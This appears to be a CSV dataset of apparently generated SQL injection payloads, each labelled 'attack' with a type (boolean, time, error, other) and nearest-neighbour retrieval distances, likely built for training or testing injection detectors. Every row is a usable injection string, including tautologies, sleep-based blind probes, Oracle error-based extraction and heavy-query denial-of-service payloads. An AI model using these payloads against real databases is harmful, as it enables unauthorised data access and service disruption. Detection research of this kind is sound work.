id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
GAN_000115,attack,boolean,"1%""  )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R002629,6.411715650791539
GAN_000116,attack,boolean,"1'   )    )    and make_set  (  8403  =  8403,8899  )   and    (    (   'bmsa'  =  'bmsa",nearest_attack_euclidean,R006515,4.679230595362589
GAN_000117,attack,boolean,1' in boolean mode  )   and 5725  =  5552#,nearest_attack_euclidean,R004118,3.9201337537973706
GAN_000118,attack,error,"1 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  -- gkcl",nearest_attack_euclidean,R001464,6.221561026324195
GAN_000119,attack,time,"make_set  (  8734  =  8734,sleep  (  5   )    )   ",nearest_attack_euclidean,R008151,4.77685889917053
GAN_000120,attack,other,or 'whatever' in   (  'whatever'  ) ,nearest_attack_euclidean,R000348,6.770196715768803
GAN_000121,attack,boolean,"1 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   # jmki",nearest_attack_euclidean,R003951,6.295345418406042
GAN_000122,attack,time,"1""   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   ""chvi"" like ""chvi",nearest_attack_euclidean,R004039,5.3174772269339226
GAN_000123,attack,other,"select count  (  *  )   from generate_series  (  1,5000000  )  #",nearest_attack_euclidean,R000928,7.026444824079283
GAN_000124,attack,boolean,"-3541"" or make_set  (  9354  =  9354,7185  )   and ""fgxu""  =  ""fgxu",nearest_attack_euclidean,R005165,4.930196663139734
GAN_000125,attack,other,1'||  (  select 'idna' from dual where 2683  =  2683 rlike   (  select   (  case when   (  3201  =  9748  )   then 1 else 0x28 end   )    )     )  ||',nearest_attack_euclidean,R007658,10.436869231516763
GAN_000126,attack,time,"1""  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  ""cwwv"" like ""cwwv",nearest_attack_euclidean,R006999,5.919559759921879
GAN_000127,attack,error,1   )    )     )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (     (  4694  =  4694,nearest_attack_euclidean,R006050,8.68606742885078
GAN_000128,attack,error,1 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    ) ,nearest_attack_euclidean,R001276,9.687268936195933
GAN_000129,attack,boolean,"1'+  (  select dgnt where 4701  =  4701 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",nearest_attack_euclidean,R002589,4.302831613734823
GAN_000130,attack,boolean,"admin"" or 1  =  1",nearest_attack_euclidean,R000141,3.8589211409580924
GAN_000131,attack,time,"1""   )    )     )   and sleep  (  5  )   and    (    (     (  ""fdvc"" like ""fdvc",nearest_attack_euclidean,R005546,8.039623188735042
GAN_000132,attack,time,"1""   )    )    or sleep  (  5  )   and    (    (   ""mtmb"" like ""mtmb",nearest_attack_euclidean,R008186,8.166750446202336
GAN_000133,attack,other,1'+  (  select goec where 9460  =  9460 rlike   (  select   (  case when   (  4740  =  1203  )   then 1 else 0x28 end   )    )     )  +',nearest_attack_euclidean,R008722,10.559222531093843
GAN_000134,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (   ""eevk""  =  ""eevk",nearest_attack_euclidean,R000753,4.779658832196001
GAN_000135,attack,time,"1""  )   or sleep  (  5  )   and   (  ""xgtk""  =  ""xgtk",nearest_attack_euclidean,R004537,5.205254329270409
GAN_000136,attack,time,"1""  )   or sleep  (  5  )   and   (  ""xgtk""  =  ""xgtk",nearest_attack_euclidean,R004537,4.9903818805619675
GAN_000137,attack,other,1 exec sp_   (  or exec xp_  ) ,nearest_attack_euclidean,R000634,3.145083189070918
GAN_000138,attack,error,"1' where 6902  =  6902 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",nearest_attack_euclidean,R008195,5.45081567476873
GAN_000139,attack,boolean,1 and user_name  (    )     =   'dbo',nearest_attack_euclidean,R000079,3.5873664821248745
GAN_000140,attack,other,1'+  (  select 'tmel' where 2655  =  2655 rlike   (  select   (  case when   (  2118  =  8500  )   then 1 else 0x28 end   )    )     )  +',nearest_attack_euclidean,R008074,9.174510941421728
GAN_000141,attack,boolean,"1""   )    )     )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  ""uqyb""  =  ""uqyb",nearest_attack_euclidean,R008542,7.852716034465248
GAN_000142,attack,other,"1,SELECT *",nearest_attack_euclidean,R000158,6.7870907874460515
GAN_000143,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and ""psbz""  =  ""psbz",nearest_attack_euclidean,R006510,5.815576760170604
GAN_000144,attack,other,select   (  case when   (  4666  =  4666  )   then 1 else 4666*  (  select 4666 from master..sysdatabases  )   end  )  --,nearest_attack_euclidean,R001931,12.268538150795058
GAN_000145,attack,other,", exec   (  'sel' + 'ect us' + 'er'  ) ",nearest_attack_euclidean,R000318,5.875987790192677
GAN_000146,attack,boolean,"1""   )    )    as oiqr where 4073  =  4073 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R001585,4.751434077665273
GAN_000147,attack,time,"""   )    )    or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000433,4.1755472986149895
GAN_000148,attack,other,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5",nearest_attack_euclidean,R007411,5.902683755431508
GAN_000149,attack,boolean,"1'+  (  select dnxi where 5850  =  5850 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R007806,7.549870441473025
GAN_000150,attack,other,"select count  (  *  )   from generate_series  (  1,5000000  )  #",nearest_attack_euclidean,R000928,6.767165104582799
GAN_000151,attack,boolean,"1 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   # jmki",nearest_attack_euclidean,R003951,6.514446136502676
GAN_000152,attack,other,"  (  select   (  case when   (  1938  =  1938  )   then dbms_pipe.receive_message  (  chr  (  118  )  ||chr  (  118  )  ||chr  (  112  )  ||chr  (  76  )  ,5  )   else 1938 end  )   from dual  )  ",nearest_attack_euclidean,R006148,5.067749833219044
GAN_000153,attack,time,1'  )   or sleep  (  5  )   and   (  'fizk'  =  'fizk,nearest_attack_euclidean,R005904,4.771731631517665
GAN_000154,attack,boolean,"1' in boolean mode  )   and make_set  (  8403  =  8403,8899  )  #",nearest_attack_euclidean,R007359,4.407234505422669
GAN_000155,attack,boolean,"1'  )   where 5317  =  5317 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R004881,6.053893892470686
GAN_000156,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (   ""eevk""  =  ""eevk",nearest_attack_euclidean,R000753,3.8550399052406443
GAN_000157,attack,other,"  (  select   (  case when   (  1938  =  1938  )   then dbms_pipe.receive_message  (  chr  (  118  )  ||chr  (  118  )  ||chr  (  112  )  ||chr  (  76  )  ,5  )   else 1938 end  )   from dual  )  ",nearest_attack_euclidean,R006148,6.817997386458625
GAN_000158,attack,boolean,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R002827,5.926735095051447
GAN_000159,attack,boolean,"1  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and   (  5099  =  5099",nearest_attack_euclidean,R001695,14.237137158842165
GAN_000160,attack,time,"1""  )   or sleep  (  5  )   and   (  ""xgtk""  =  ""xgtk",nearest_attack_euclidean,R004537,3.9991771811248698
GAN_000161,attack,time,"1""  )   or sleep  (  5  )   and   (  ""xgtk""  =  ""xgtk",nearest_attack_euclidean,R004537,5.6896695024041035
GAN_000162,attack,boolean,"1 where 7906  =  7906 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R006084,4.374075471163843
GAN_000163,attack,boolean,"-7971   )    )    as armw where 9474  =  9474 or make_set  (  9354  =  9354,7185  )  --",nearest_attack_euclidean,R006867,3.367895133823708
GAN_000164,attack,boolean,"1   )    )     )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  2997  =  2997",nearest_attack_euclidean,R005785,6.3737141645120445
GAN_000165,attack,time,1' or sleep  (  5  )   and 'udqz'  =  'udqz,nearest_attack_euclidean,R006689,7.669720864709438
GAN_000166,attack,error,"1%""   )    )    and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R004762,7.151543894151683
GAN_000167,attack,error,"1"" and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   ",nearest_attack_euclidean,R002687,6.296684197100596
GAN_000168,attack,other,"  (  select   (  case when   (  1938  =  1938  )   then dbms_pipe.receive_message  (  chr  (  118  )  ||chr  (  118  )  ||chr  (  112  )  ||chr  (  76  )  ,5  )   else 1938 end  )   from dual  )  ",nearest_attack_euclidean,R006148,5.395777257431772
GAN_000169,attack,time,1'  )   and sleep  (  5  )   and   (  'xecl' like 'xecl,nearest_attack_euclidean,R003879,8.135726469616234
GAN_000170,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'gsup'  =  'gsup",nearest_attack_euclidean,R005507,3.612671255562353
GAN_000171,attack,boolean,"admin"" or 1  =  1",nearest_attack_euclidean,R000141,4.62650830958569
GAN_000172,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  ""nwjv""  =  ""nwjv",nearest_attack_euclidean,R008343,4.561405579367036
GAN_000173,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R001030,5.777063044913533
GAN_000174,attack,time,"1""   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   ""chvi"" like ""chvi",nearest_attack_euclidean,R004039,8.106898533136127
GAN_000175,attack,boolean,hi' or 1  =  1 --,nearest_attack_euclidean,R000459,4.3643928029906425
GAN_000176,attack,time,1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  # lwfs,nearest_attack_euclidean,R001060,7.5426818266324585
GAN_000177,attack,error,"1' and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R005088,5.435127872472616
GAN_000178,attack,boolean,"1'   )    )     )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  'skdy'  =  'skdy",nearest_attack_euclidean,R004367,5.490050811029078
GAN_000179,attack,boolean,"1""   )    )    as jmoy where 9676  =  9676 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R005006,5.061014722518578
GAN_000180,attack,boolean, or 'x'  =  'x,nearest_attack_euclidean,R000533,4.3093054788877705
GAN_000181,attack,time,1' or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R002647,6.2703221164847305
GAN_000182,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'gsup'  =  'gsup",nearest_attack_euclidean,R005507,3.0085291606044997
GAN_000183,attack,other,"select count  (  *  )   from generate_series  (  1,5000000  )  #",nearest_attack_euclidean,R000928,5.284393567802373
GAN_000184,attack,boolean,"1   )    )    as spdf where 8554  =  8554 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",nearest_attack_euclidean,R004450,5.825646442283879
GAN_000185,attack,other,select   (  case when   (  4666  =  4666  )   then 1 else 4666*  (  select 4666 from master..sysdatabases  )   end  )  --,nearest_attack_euclidean,R001931,6.861625046581763
GAN_000186,attack,boolean,"1 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   # jmki",nearest_attack_euclidean,R003951,5.4646481436607255
GAN_000187,attack,boolean,"1""   )    )    as pxdp where 4575  =  4575 and elt  (  8258  =  7218,7218  )  --",nearest_attack_euclidean,R003369,2.7341675748545935
GAN_000188,attack,boolean,"1   )    )     (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and    (    (   1402  =  1402",nearest_attack_euclidean,R006861,6.356711403463302
GAN_000189,attack,boolean," end and ""%""  =  """,nearest_attack_euclidean,R008957,6.495862932453702
GAN_000190,attack,error,"1'+  (  select vohg where 6383  =  6383 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )      )    )   +'",nearest_attack_euclidean,R007553,5.93498662587613
GAN_000191,attack,time,"1""  )   or elt  (  6272  =  6272,sleep  (  5   )    )    and   (  ""dplf"" like ""dplf",nearest_attack_euclidean,R002388,5.334868309802045
GAN_000192,attack,boolean,"1'+  (  select dnxi where 5850  =  5850 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R007806,6.675932913675754
GAN_000193,attack,boolean,1 and user_name  (    )     =   'dbo',nearest_attack_euclidean,R000079,3.471419704531343
GAN_000194,attack,boolean,"1""   )    )     )   and make_set  (  7809  =  9564,9564  )   and    (    (     (  ""jggk"" like ""jggk",nearest_attack_euclidean,R008208,5.4232771593089115
GAN_000195,attack,boolean,"1""   )    )    and make_set  (  8403  =  8403,8899  )   and    (    (   ""nsyl""  =  ""nsyl",nearest_attack_euclidean,R005178,4.1597513442294956
GAN_000196,attack,time,"1 or elt  (  6272  =  6272,sleep  (  5   )    )   # klaw",nearest_attack_euclidean,R006497,6.128193661341489
GAN_000197,attack,boolean,1 and user_name  (    )     =   'dbo',nearest_attack_euclidean,R000079,3.769786147702742
GAN_000198,attack,other,select 'qqpjq'||  (  select   (  case when   (  2933  =  2933  )   then 1 else 0 end   )    )   ||'qzvzq',nearest_attack_euclidean,R004710,11.822978112072418
GAN_000199,attack,boolean,"1"" where 1618  =  1618 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R008642,3.6332979502322837
GAN_000200,attack,boolean,"1'+  (  select mumb where 4658  =  4658 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R008158,6.76100905852616
GAN_000201,attack,boolean,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'gtcb'  =  'gtcb",nearest_attack_euclidean,R003361,3.343273759586179
GAN_000202,attack,boolean,1 and user_name  (    )     =   'dbo',nearest_attack_euclidean,R000079,3.5639393292882824
GAN_000203,attack,time,"1""   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   ""utlk"" like ""utlk",nearest_attack_euclidean,R007369,7.908726223294277
